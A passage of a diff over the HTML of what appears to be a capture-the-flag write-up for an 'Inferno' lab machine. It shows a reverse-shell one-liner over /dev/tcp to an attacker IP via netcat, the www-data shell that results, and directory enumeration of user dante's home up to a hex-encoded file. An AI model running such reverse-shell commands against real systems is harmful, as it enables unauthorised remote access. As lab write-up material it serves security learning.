-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;/dev/tcp/10.9.140.180/1235 0&gt;&amp;1 2&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> nc -lnvp <span class="m">1234</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;/dev/tcp/10.9.140.180/1235 0&gt;&amp;1 2&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> nc -lnvp <span class="m">1234</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lnvp <span class="m">1235</span>
-connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.241.114<span class="o">]</span> <span class="m">52036</span>
-bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>922<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
-bash: no job control in this shell
-www-data@Inferno:/var/www/html/inferno/components/filemanager$ <span class="nb">exit</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lnvp <span class="m">1235</span>
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.241.114<span class="o">]</span> <span class="m">52036</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>922<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@Inferno:/var/www/html/inferno/components/filemanager$ <span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Right after getting a reverse shell we are getting kicked out.<br />
 We can spawn <code>/bin/sh</code> in a hope of bypassing this (probably) security measure.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2204,31 +2204,31 @@ We can spawn <code>/bin/sh</code> in a hope of bypassing this (probably) securit
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">id      
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-whoami 
-www-data
-<span class="nb">pwd</span>
-/var/www/html/inferno/components/filemanager
-ls -la
-total <span class="m">100</span>
-drwxr-xr-x  <span class="m">3</span> root root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 .
-drwxr-xr-x <span class="m">17</span> root root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 ..
--rwxr-xr-x  <span class="m">1</span> root root  <span class="m">1831</span> Jan <span class="m">11</span> 15:22 class.dirzip.php
--rwxr-xr-x  <span class="m">1</span> root root <span class="m">22371</span> Jan <span class="m">11</span> 15:22 class.filemanager.php
--rwxr-xr-x  <span class="m">1</span> root root  <span class="m">3480</span> Jan <span class="m">11</span> 15:22 context_menu.json
--rwxr-xr-x  <span class="m">1</span> root root  <span class="m">2695</span> Jan <span class="m">11</span> 15:22 controller.php
--rwxr-xr-x  <span class="m">1</span> root root  <span class="m">5501</span> Jan <span class="m">11</span> 15:22 dialog.php
--rwxr-xr-x  <span class="m">1</span> root root  <span class="m">2092</span> Jan <span class="m">11</span> 15:22 dialog_upload.php
--rwxr-xr-x  <span class="m">1</span> root root  <span class="m">3406</span> Jan <span class="m">11</span> 15:22 download.php
--rwxr-xr-x  <span class="m">1</span> root root <span class="m">34802</span> Jan <span class="m">11</span> 15:22 init.js
-drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 upload_scripts
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">id      
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">whoami 
+</span></span><span class="line"><span class="cl">www-data
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/var/www/html/inferno/components/filemanager
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">100</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">17</span> root root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 ..
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">1831</span> Jan <span class="m">11</span> 15:22 class.dirzip.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root <span class="m">22371</span> Jan <span class="m">11</span> 15:22 class.filemanager.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">3480</span> Jan <span class="m">11</span> 15:22 context_menu.json
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">2695</span> Jan <span class="m">11</span> 15:22 controller.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">5501</span> Jan <span class="m">11</span> 15:22 dialog.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">2092</span> Jan <span class="m">11</span> 15:22 dialog_upload.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">3406</span> Jan <span class="m">11</span> 15:22 download.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root <span class="m">34802</span> Jan <span class="m">11</span> 15:22 init.js
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 upload_scripts
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Navigating to home directory we will find that there is another user present on the system called <strong>dante</strong>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2261,43 +2261,43 @@ drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Jan 
 </span><span class="lnt">31
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /home
-ls -la
-total <span class="m">12</span>
-drwxr-xr-x  <span class="m">3</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:19 .
-drwxr-xr-x <span class="m">24</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 14:57 ..
-drwxr-xr-x <span class="m">13</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:46 dante
-<span class="nb">cd</span> dante
-ls -la
-total <span class="m">72</span>
-drwxr-xr-x <span class="m">13</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:46 .
-drwxr-xr-x  <span class="m">3</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:19 ..
--rw-------  <span class="m">1</span> dante dante  <span class="m">106</span> Jan <span class="m">11</span> 15:27 .Xauthority
-lrwxrwxrwx  <span class="m">1</span> root  root     <span class="m">9</span> Jan <span class="m">11</span> 15:22 .bash_history -&gt; /dev/null
--rw-r--r--  <span class="m">1</span> dante dante  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
--rw-r--r--  <span class="m">1</span> dante dante <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
-drwx------  <span class="m">2</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:25 .cache
-drwxr-x---  <span class="m">3</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:46 .config
-drwx------  <span class="m">4</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:46 .gnupg
--rw-r--r--  <span class="m">1</span> dante dante  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
--rw-r--r--  <span class="m">1</span> dante dante    <span class="m">0</span> Jan <span class="m">11</span> 15:30 .sudo_as_admin_successful
-drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:29 Desktop
-drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:29 Documents
-drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:29 Downloads
-drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Music
-drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Pictures
-drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Public
-drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Templates
-drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Videos
--rw-------  <span class="m">1</span> dante dante   <span class="m">33</span> Jan <span class="m">11</span> 15:22 local.txt
-cat local.txt
-cat: local.txt: Permission denied
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /home
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">12</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:19 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">24</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 14:57 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">13</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:46 dante
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> dante
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">72</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">13</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:46 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:19 ..
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> dante dante  <span class="m">106</span> Jan <span class="m">11</span> 15:27 .Xauthority
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root  root     <span class="m">9</span> Jan <span class="m">11</span> 15:22 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dante dante  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dante dante <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:25 .cache
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">3</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:46 .config
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">4</span> dante dante <span class="m">4096</span> Jan <span class="m">11</span> 15:46 .gnupg
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dante dante  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dante dante    <span class="m">0</span> Jan <span class="m">11</span> 15:30 .sudo_as_admin_successful
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:29 Desktop
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:29 Documents
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:29 Downloads
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Music
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Pictures
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Public
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Templates
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root  <span class="m">4096</span> Jan <span class="m">11</span> 15:22 Videos
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> dante dante   <span class="m">33</span> Jan <span class="m">11</span> 15:22 local.txt
+</span></span><span class="line"><span class="cl">cat local.txt
+</span></span><span class="line"><span class="cl">cat: local.txt: Permission denied
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Proceeding with directory enumeration we will find interesting file in the <strong>Downlaods</strong> folder.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2335,54 +2335,54 @@ cat: local.txt: Permission denied
 </span><span class="lnt">36
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> Documents	
-ls -la
-total <span class="m">464</span>
-drwxr-xr-x  <span class="m">2</span> root  root    <span class="m">4096</span> Jan <span class="m">11</span> 15:29 .
-drwxr-xr-x <span class="m">13</span> dante dante   <span class="m">4096</span> Jan <span class="m">11</span> 15:46 ..
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">35312</span> Jan <span class="m">11</span> 15:29 beatrice.doc
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">63704</span> Jan <span class="m">11</span> 15:29 caronte.doc
--rwxr-xr-x  <span class="m">1</span> root  root  <span class="m">133792</span> Jan <span class="m">11</span> 15:29 centauro.doc
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">88280</span> Jan <span class="m">11</span> 15:29 cerbero.doc
--rwxr-xr-x  <span class="m">1</span> root  root  <span class="m">137440</span> Jan <span class="m">11</span> 15:29 virgilio.doc
-<span class="nb">cd</span> ..
-<span class="nb">cd</span> Downloads
-ls -la 
-total <span class="m">4420</span>
-drwxr-xr-x  <span class="m">2</span> root  root     <span class="m">4096</span> Jan <span class="m">11</span> 15:29 .
-drwxr-xr-x <span class="m">13</span> dante dante    <span class="m">4096</span> Jan <span class="m">11</span> 15:46 ..
--rw-r--r--  <span class="m">1</span> root  root     <span class="m">1511</span> Nov  <span class="m">3</span> 11:52 .download.dat
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">137440</span> Jan <span class="m">11</span> 15:29 CantoI.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">141528</span> Jan <span class="m">11</span> 15:29 CantoII.docx
--rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">88280</span> Jan <span class="m">11</span> 15:29 CantoIII.docx
--rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">63704</span> Jan <span class="m">11</span> 15:29 CantoIV.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">133792</span> Jan <span class="m">11</span> 15:29 CantoIX.docx
--rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">43224</span> Jan <span class="m">11</span> 15:22 CantoV.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">133792</span> Jan <span class="m">11</span> 15:29 CantoVI.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">141528</span> Jan <span class="m">11</span> 15:29 CantoVII.docx
--rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">63704</span> Jan <span class="m">11</span> 15:29 CantoX.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">121432</span> Jan <span class="m">11</span> 15:29 CantoXI.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">149080</span> Jan <span class="m">11</span> 15:22 CantoXII.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">216256</span> Jan <span class="m">11</span> 15:22 CantoXIII.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">141528</span> Jan <span class="m">11</span> 15:29 CantoXIV.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">141528</span> Jan <span class="m">11</span> 15:29 CantoXIX.docx
--rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">88280</span> Jan <span class="m">11</span> 15:29 CantoXV.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">137440</span> Jan <span class="m">11</span> 15:29 CantoXVI.docx
--rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">121432</span> Jan <span class="m">11</span> 15:29 CantoXVII.docx
--rwxr-xr-x  <span class="m">1</span> root  root  <span class="m">2351792</span> Jan <span class="m">11</span> 15:22 CantoXVIII.docx
--rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">63704</span> Jan <span class="m">11</span> 15:29 CantoXX.docx
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> Documents	
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">464</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root    <span class="m">4096</span> Jan <span class="m">11</span> 15:29 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">13</span> dante dante   <span class="m">4096</span> Jan <span class="m">11</span> 15:46 ..
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">35312</span> Jan <span class="m">11</span> 15:29 beatrice.doc
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">63704</span> Jan <span class="m">11</span> 15:29 caronte.doc
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root  <span class="m">133792</span> Jan <span class="m">11</span> 15:29 centauro.doc
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">88280</span> Jan <span class="m">11</span> 15:29 cerbero.doc
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root  <span class="m">137440</span> Jan <span class="m">11</span> 15:29 virgilio.doc
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> Downloads
+</span></span><span class="line"><span class="cl">ls -la 
+</span></span><span class="line"><span class="cl">total <span class="m">4420</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root  root     <span class="m">4096</span> Jan <span class="m">11</span> 15:29 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">13</span> dante dante    <span class="m">4096</span> Jan <span class="m">11</span> 15:46 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root  root     <span class="m">1511</span> Nov  <span class="m">3</span> 11:52 .download.dat
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">137440</span> Jan <span class="m">11</span> 15:29 CantoI.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">141528</span> Jan <span class="m">11</span> 15:29 CantoII.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">88280</span> Jan <span class="m">11</span> 15:29 CantoIII.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">63704</span> Jan <span class="m">11</span> 15:29 CantoIV.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">133792</span> Jan <span class="m">11</span> 15:29 CantoIX.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">43224</span> Jan <span class="m">11</span> 15:22 CantoV.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">133792</span> Jan <span class="m">11</span> 15:29 CantoVI.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">141528</span> Jan <span class="m">11</span> 15:29 CantoVII.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">63704</span> Jan <span class="m">11</span> 15:29 CantoX.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">121432</span> Jan <span class="m">11</span> 15:29 CantoXI.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">149080</span> Jan <span class="m">11</span> 15:22 CantoXII.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">216256</span> Jan <span class="m">11</span> 15:22 CantoXIII.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">141528</span> Jan <span class="m">11</span> 15:29 CantoXIV.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">141528</span> Jan <span class="m">11</span> 15:29 CantoXIX.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">88280</span> Jan <span class="m">11</span> 15:29 CantoXV.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">137440</span> Jan <span class="m">11</span> 15:29 CantoXVI.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root   <span class="m">121432</span> Jan <span class="m">11</span> 15:29 CantoXVII.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root  <span class="m">2351792</span> Jan <span class="m">11</span> 15:22 CantoXVIII.docx
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root  root    <span class="m">63704</span> Jan <span class="m">11</span> 15:29 CantoXX.docx
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Found <code>.download.dat</code> file contains hexadecimal values which we will convert into ASCII characters.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">cat .download.dat
-c2 ab 4f <span class="m">72</span> <span class="m">20</span> <span class="m">73</span> <span class="m">65</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> <span class="m">74</span> <span class="m">75</span> <span class="m">20</span> <span class="m">71</span> <span class="m">75</span> <span class="m">65</span> 6c <span class="m">20</span> <span class="m">56</span> <span class="m">69</span> <span class="m">72</span> <span class="m">67</span> <span class="m">69</span> 6c <span class="m">69</span> 6f <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> <span class="m">71</span> <span class="m">75</span> <span class="m">65</span> 6c 6c <span class="m">61</span> <span class="m">20</span> <span class="m">66</span> 6f 6e <span class="m">74</span> <span class="m">65</span> 0a <span class="m">63</span> <span class="m">68</span> <span class="m">65</span> <span class="m">20</span> <span class="m">73</span> <span class="m">70</span> <span class="m">61</span> 6e <span class="m">64</span> <span class="m">69</span> <span class="m">20</span> <span class="m">64</span> <span class="m">69</span> <span class="m">20</span> <span class="m">70</span> <span class="m">61</span> <span class="m">72</span> 6c <span class="m">61</span> <span class="m">72</span> <span class="m">20</span> <span class="m">73</span> c3 ac <span class="m">20</span> 6c <span class="m">61</span> <span class="m">72</span> <span class="m">67</span> 6f <span class="m">20</span> <span class="m">66</span> <span class="m">69</span> <span class="m">75</span> 6d <span class="m">65</span> 3f c2 bb 2c 0a <span class="m">72</span> <span class="m">69</span> <span class="m">73</span> <span class="m">70</span> <span class="m">75</span> 6f <span class="m">73</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">69</span> 6f <span class="m">20</span> 6c <span class="m">75</span> <span class="m">69</span> <span class="m">20</span> <span class="m">63</span> 6f 6e <span class="m">20</span> <span class="m">76</span> <span class="m">65</span> <span class="m">72</span> <span class="m">67</span> 6f <span class="m">67</span> 6e 6f <span class="m">73</span> <span class="m">61</span> <span class="m">20</span> <span class="m">66</span> <span class="m">72</span> 6f 6e <span class="m">74</span> <span class="m">65</span> 2e 0a 0a c2 ab 4f <span class="m">20</span> <span class="m">64</span> <span class="m">65</span> <span class="m">20</span> 6c <span class="m">69</span> <span class="m">20</span> <span class="m">61</span> 6c <span class="m">74</span> <span class="m">72</span> <span class="m">69</span> <span class="m">20</span> <span class="m">70</span> 6f <span class="m">65</span> <span class="m">74</span> <span class="m">69</span> <span class="m">20</span> 6f 6e 6f <span class="m">72</span> <span class="m">65</span> <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> 6c <span class="m">75</span> 6d <span class="m">65</span> 2c 0a <span class="m">76</span> <span class="m">61</span> <span class="m">67</span> 6c <span class="m">69</span> <span class="m">61</span> 6d <span class="m">69</span> <span class="m">20</span> e2 <span class="m">80</span> <span class="m">99</span> 6c <span class="m">20</span> 6c <span class="m">75</span> 6e <span class="m">67</span> 6f <span class="m">20</span> <span class="m">73</span> <span class="m">74</span> <span class="m">75</span> <span class="m">64</span> <span class="m">69</span> 6f <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> e2 <span class="m">80</span> <span class="m">99</span> 6c <span class="m">20</span> <span class="m">67</span> <span class="m">72</span> <span class="m">61</span> 6e <span class="m">64</span> <span class="m">65</span> <span class="m">20</span> <span class="m">61</span> 6d 6f <span class="m">72</span> <span class="m">65</span> 0a <span class="m">63</span> <span class="m">68</span> <span class="m">65</span> <span class="m">20</span> 6d e2 <span class="m">80</span> <span class="m">99</span> <span class="m">68</span> <span class="m">61</span> <span class="m">20</span> <span class="m">66</span> <span class="m">61</span> <span class="m">74</span> <span class="m">74</span> 6f <span class="m">20</span> <span class="m">63</span> <span class="m">65</span> <span class="m">72</span> <span class="m">63</span> <span class="m">61</span> <span class="m">72</span> <span class="m">20</span> 6c 6f <span class="m">20</span> <span class="m">74</span> <span class="m">75</span> 6f <span class="m">20</span> <span class="m">76</span> 6f 6c <span class="m">75</span> 6d <span class="m">65</span> 2e 0a 0a <span class="m">54</span> <span class="m">75</span> <span class="m">20</span> <span class="m">73</span> <span class="m">65</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> 6c 6f <span class="m">20</span> 6d <span class="m">69</span> 6f <span class="m">20</span> 6d <span class="m">61</span> <span class="m">65</span> <span class="m">73</span> <span class="m">74</span> <span class="m">72</span> 6f <span class="m">20</span> <span class="m">65</span> <span class="m">20</span> e2 <span class="m">80</span> <span class="m">99</span> 6c <span class="m">20</span> 6d <span class="m">69</span> 6f <span class="m">20</span> <span class="m">61</span> <span class="m">75</span> <span class="m">74</span> 6f <span class="m">72</span> <span class="m">65</span> 2c 0a <span class="m">74</span> <span class="m">75</span> <span class="m">20</span> <span class="m">73</span> <span class="m">65</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> <span class="m">73</span> 6f 6c 6f <span class="m">20</span> <span class="m">63</span> 6f 6c <span class="m">75</span> <span class="m">69</span> <span class="m">20</span> <span class="m">64</span> <span class="m">61</span> <span class="m">20</span> <span class="m">63</span> <span class="m">75</span> e2 <span class="m">80</span> <span class="m">99</span> <span class="m">20</span> <span class="m">69</span> 6f <span class="m">20</span> <span class="m">74</span> 6f 6c <span class="m">73</span> <span class="m">69</span> 0a 6c 6f <span class="m">20</span> <span class="m">62</span> <span class="m">65</span> 6c 6c 6f <span class="m">20</span> <span class="m">73</span> <span class="m">74</span> <span 